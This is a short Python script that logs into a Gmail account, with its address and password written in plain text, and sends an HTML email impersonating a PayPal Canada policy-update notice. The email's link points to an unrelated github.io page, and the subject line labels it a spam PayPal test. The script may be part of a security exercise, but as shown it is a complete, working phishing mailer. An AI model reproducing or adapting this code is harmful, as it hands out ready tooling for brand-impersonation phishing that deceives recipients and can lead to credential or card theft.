import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


class send:

    def __init__(self, receiver_email):
        self.receiver_email = receiver_email
        
    def send(self):

        sender_email = "definitelynotspam69420@gmail.com"
        password = "shanylove"

        message = MIMEMultipart("alternative")
        message["Subject"] = "SPAM PAYPAL TEST"
        message["From"] = sender_email
        message["To"] = self.receiver_email

        # Create the plain-text and HTML version of your message
        text = """\
        Hi,
        How are you?
        Real Python has many great tutorials:
        www.realpython.com"""
        html = """\
        <html>
          <body>
            <p>We are making some changes to our PayPal Canada User Agreement and Privacy Policy. These changes will go into effect on December 11, 2018. If you're interested in more detail, please visit our 
            <a href="https://thatdamnwizard.github.io/DossierSecurtie/">Policy Updates page.</a>
               <br>
               What you'll see in the updated User Agreement & Privacy Policy
               We're updating our Agreement to clarify that we may update your credit or debit card information without any action on your part, and such information may be acquired from a third party. If you do not wish to have the card information updated, you may contact your card issuer to request this, or remove the card from your PayPal Account.
               We're clarifying how refunds are processed including the return of funds directly to a linked bank account and making refunds available sooner in some circumstances.
               We're updating the name of our Privacy Policy to Privacy Statement.

               Thank you for being a PayPal customer. 

                Sincerely, 
            </p>
          </body>
        </html>
        """

        # Turn these into plain/html MIMEText objectstachment
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")

        # Add HTML/plain-text parts to MIMEMultipart message
        # The email client will try to render the last part first
        message.attach(part1)
        message.attach(part2)

        # Create secure connection with server and send email
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(sender_email, password)
            server.sendmail(
                sender_email, self.receiver_email, message.as_string()
            )

